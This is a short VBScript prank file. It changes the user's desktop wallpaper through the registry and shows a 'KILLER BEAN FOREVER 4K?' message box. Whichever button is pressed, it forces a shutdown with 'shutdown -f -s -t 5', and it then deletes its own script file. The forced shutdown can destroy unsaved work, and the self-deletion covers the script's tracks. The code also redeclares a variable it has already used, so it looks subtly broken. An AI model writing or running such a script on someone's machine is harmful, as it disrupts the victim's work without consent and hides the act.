Set objFSO = CreateObject("Scripting.FileSystemObject")

dim wshShell 
dim sUserName
dim result

Set wshShell = WScript.CreateObject("WScript.Shell") 
sUserName = wshShell.ExpandEnvironmentStrings("%USERNAME%")

Set oShell = CreateObject("WScript.Shell") 
Set oFSO = CreateObject("Scripting.FileSystemObject")

sWinDir = oFSO.GetSpecialFolder(0) 
sWallPaper = "C:\temp/kb.jpg"

' update in registry 
oShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", sWallPaper

' let the system know about the change 
oShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True


            WScript.sleep 5000

result = MsgBox ("KILLER BEAN FOREVER 4K?", vbYesNo, "Choose Wisely")
Select Case result
    Case vbYes
        MsgBox("MEMES")
        Dim oShell
        Set oShell = WScript.CreateObject("WScript.Shell")
        oShell.Run "C:\WINDOWS\system32\shutdown.exe -f -s -t 5"
    Case vbNo
        MsgBox("MEMES")
        Set oShell = WScript.CreateObject("WScript.Shell")
        oShell.Run "C:\WINDOWS\system32\shutdown.exe -f -s -t 5"
End Select


strScript = Wscript.ScriptFullName

objFSO.DeleteFile(strScript)
